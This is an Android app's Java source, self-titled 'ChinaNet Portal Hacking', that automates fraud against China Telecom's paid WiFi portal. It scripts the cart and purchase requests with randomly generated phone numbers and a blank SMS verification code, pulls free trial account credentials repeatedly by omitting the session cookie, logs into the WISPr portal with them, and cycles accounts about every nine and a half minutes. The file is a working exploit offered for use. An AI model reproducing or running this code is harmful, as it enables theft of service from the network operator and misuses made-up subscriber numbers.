package snc.lsr.ct_hack;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.widget.TextView;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import lsr.HttpRequester;
import lsr.HttpRespons;

public class MainActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		final TextView console = (TextView) findViewById(R.id.console);

		final Handler handler =new Handler(){
			@Override
			public void handleMessage(Message msg){
				super.handleMessage(msg);
				String message=(String)msg.obj;
				console.setText(console.getText()+message+"\n");
			}
		};
		
		new Thread(){
			@Override
			public void run(){
				
		        String a = "ChinaNet Portal Hacking v0.4.0 by Dolphin @BUCT_SNC_SYS.\n";
		        	a += "Copyright 2014 Dolphin Wood.\n";
		        	a += "Licensed under http://opensource.org/licenses/MIT\n\n";
		        	a += "Designed and built with all the love in the world.\n\n";
		        	a += "Everything will be done automatically :)\n\n";
		        	a += "ReBuild to Java by Nyx @BUCT_SNC_DEV.\n";
		        	a += "进程守护已启动！\n";
		        	a += "--> 正在获取网关地址，请稍候...\n";

                Message message = handler.obtainMessage();
                message.obj=a;
                handler.sendMessage(message);
                
		        try {
		            HttpRequester request = new HttpRequester();
		            HttpRequester addGood = new HttpRequester();
		            HttpRequester openCart = new HttpRequester();
		            HttpRequester reqAc = new HttpRequester();
		            HttpRequester login = new HttpRequester();
		            
		            URL url = new java.net.URL("http://www.baidu.com");
			        URL loginUrl = new java.net.URL("http://wifi.189.cn/service/index.jsp");
			        
					HttpURLConnection loginConnection = null;
		            HttpURLConnection connection = (java.net.HttpURLConnection)url.openConnection();
		            connection.setRequestProperty("User-Agent", "CDMA+WLAN");
		            
		            Map<String,String> map1 = new HashMap<String,String>();
		            Map<String,String> map2 = new HashMap<String,String>();
		            Map<String,String> map3 = new HashMap<String,String>();
		            Map<String,String> map4 = new HashMap<String,String>();
		            Map<String,String> map5 = new HashMap<String,String>();
		            
		            map1.put("method","addGood");
		            map1.put("confirm", "yes");
		            map1.put("cardId", "1");
		            map1.put("type", "1");
		            map1.put("count", "1");
		            map2.put("method", "list");
		            map3.put("method", "buy");
		            map3.put("confirm", "yes");
		            map3.put("shopCartFlag", "shopCart");
		            map3.put("cardType", "1");
		            map3.put("cardPayType", "yi");
		            map3.put("user_phone", "");
		            map3.put("smsVerifyCode", "");
		            map3.put("isBenJi", "no");
		            map4.put("method", "get10mCard");
		            
		            connection.connect();
		            int status_code = connection.getResponseCode();
		            if(status_code==302)
		            {
		            	String location = connection.getHeaderField("Location");
			            
		            	Message message1 = handler.obtainMessage();
		                message1.obj="获取到的登录地址："+location+"\n";
		                handler.sendMessage(message1);
		                
			            URL redUrl = new URL(location);
			            HttpURLConnection redConnection = (java.net.HttpURLConnection)redUrl.openConnection();
			            redConnection.setRequestProperty("User-Agent", "CDMA+WLAN");
		            	String newLocation = redConnection.getHeaderField("Location");

			            HttpRespons hr2 = request.makeContent(newLocation, redConnection); 
			            System.out.println(hr2.getContent());

			            connection.disconnect();

			            loginConnection = (HttpURLConnection) loginUrl.openConnection();
			            loginConnection.setRequestMethod("GET");
			            loginConnection.setRequestProperty("user-agent", "CDMA+WLAN");

			            loginConnection.setUseCaches(false);
			    		
			    		loginConnection.connect();
			    		Message message2 = handler.obtainMessage();
		                message2.obj="开始模拟购买时长卡\n";
		                handler.sendMessage(message2);
			            String cookie = (loginConnection.getHeaderField("Set-Cookie")).substring(0,46);
			            Message message3 = handler.obtainMessage();
			            message3.obj="获得的 cookie："+cookie+"\n";
		                handler.sendMessage(message3);
		                
			            loginConnection.disconnect();

			            Message message4 = handler.obtainMessage();
			            message4.obj="开始模拟向购物车添加物品...\n";
		                handler.sendMessage(message4);
			            addGood.sendGet("http://wifi.189.cn/service/cart.do",map1,cookie);
			            Message message5 = handler.obtainMessage();
			            message5.obj="打开购物车，使请求有效化...\n";
		                handler.sendMessage(message5);
			            openCart.sendGet("http://wifi.189.cn/service/cart.do",map2,cookie);

//			            Random random = new Random();
//			            String phone_num = String.valueOf(random.nextInt(100000000));
//			            phone_num = "131"+phone_num;
			            Random random = new Random();
			            String phone_num = "131";
			            for(int i=1;i<=8;i++)
			            	phone_num = phone_num + String.valueOf(random.nextInt(10));
			            
			            map3.put("phone", phone_num);
			            map3.put("phone_1", phone_num);
			            Message message6 = handler.obtainMessage();
			            message6.obj="开始获取订单号，手机号："+phone_num+"...\n";
		                handler.sendMessage(message6);
			            HttpRespons data = openCart.sendGet("http://wifi.189.cn/service/user.do",map3,cookie);
			            
			            String orderNum = data.getContent().substring(2,18);
			            
			            Message message7 = handler.obtainMessage();
			            message7.obj="得到的订单号："+orderNum+"\n";
		                handler.sendMessage(message7);

		                Message message8 = handler.obtainMessage();
			            message8.obj="开始获取账号密码...\n";
		                handler.sendMessage(message8);
			            map4.put("orderId", orderNum);
			            // 不带 cookie 以便多次获得账号密码
			            HttpRespons key = reqAc.sendGet("http://wifi.189.cn/clientApi.do",map4);
			            String receData = key.getContent();
			            Message message9 = handler.obtainMessage();
			            message9.obj="收到的数据："+receData;
		                handler.sendMessage(message9);
			            String acc = receData.substring(11, 23);
		                String pss = receData.substring(24);
//			            System.out.println(acc);
//			            System.out.println(pss);

			            Message message10 = handler.obtainMessage();
			            message10.obj="开始登录...\n";
		                handler.sendMessage(message10);
			            map5.put("UserName", acc+"@wlan.sh.chntel.com");
			            map5.put("Password", pss);

					    URLConnection loginC = new URL("https://wlan.ct10000.com/portal/wispr.login?NasType=Huawei-NasName=BJ-JA-SR-1.M.ME60").openConnection();
					    loginC.setRequestProperty("user-agent", "CDMA+WLAN");
					    loginC.setRequestProperty("method", "POST");
					    loginC.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
//								    
			            loginC.setDoOutput(true);
			            loginC.setDoInput(true);
			            
						StringBuffer param = new StringBuffer();

						param.append("&");
						param.append("UserName").append("=").append(acc+"@wlan.sh.chntel.com");
						param.append("&");
						param.append("Password").append("=").append(pss);

						loginC.getOutputStream().write(param.toString().getBytes());
						loginC.getOutputStream().flush();
						loginC.getOutputStream().close();
						
						System.out.println(loginC);
						System.out.println(loginC.getContent());
						
			            HttpURLConnection testC = (HttpURLConnection)new java.net.URL("http://www.baidu.com").openConnection();
			            testC.connect();
			            if(testC.getResponseCode()==200)
			            {
			            	Message message11 = handler.obtainMessage();
				            message11.obj="登录成功！九分半后开始切换账号";
			                handler.sendMessage(message11);
			            }
			            else{

			            	Message message12 = handler.obtainMessage();
				            message12.obj="登录失败，一秒后再次尝试登录...\n";
			                handler.sendMessage(message12);
				            int i = 1;
				            do{i++;}while(i<10000);
				            
						    URLConnection loginC2 = new URL("https://wlan.ct10000.com/portal/wispr.login?NasType=Huawei-NasName=BJ-JA-SR-1.M.ME60").openConnection();
						    loginC2.setRequestProperty("user-agent", "CDMA+WLAN");
						    loginC2.setRequestProperty("method", "POST");
						    loginC2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
	
				            loginC2.setDoOutput(true);
				            loginC2.setDoInput(true);
				            
							StringBuffer param2 = new StringBuffer();
	
							param2.append("&");
							param2.append("UserName").append("=").append(acc+"@wlan.sh.chntel.com");
							param2.append("&");
							param2.append("Password").append("=").append(pss);
								
							loginC2.getOutputStream().write(param2.toString().getBytes());
							loginC2.getOutputStream().flush();
							loginC2.getOutputStream().close();
							
							System.out.println(loginC2);
							System.out.println(loginC2.getContent());
							
			            }
		            }else if(status_code==200){
		            	Message message13 = handler.obtainMessage();
			            message13.obj="您现在已连接到网络，无需破解\n";
		                handler.sendMessage(message13);
		            }else{
		            	Message message14 = handler.obtainMessage();
			            message14.obj="没有获得网关地址，请检查网络连接";
		                handler.sendMessage(message14);
		            }

		        } catch (Exception e) {
		        	Message messagee = handler.obtainMessage();
		            messagee.obj="请求出错: " + e.getMessage() + ",请检查网络连接";
	                handler.sendMessage(messagee);
		            e.printStackTrace();
		        }
		handler.sendEmptyMessage(0);
		}
	}.start();
	}
}
 
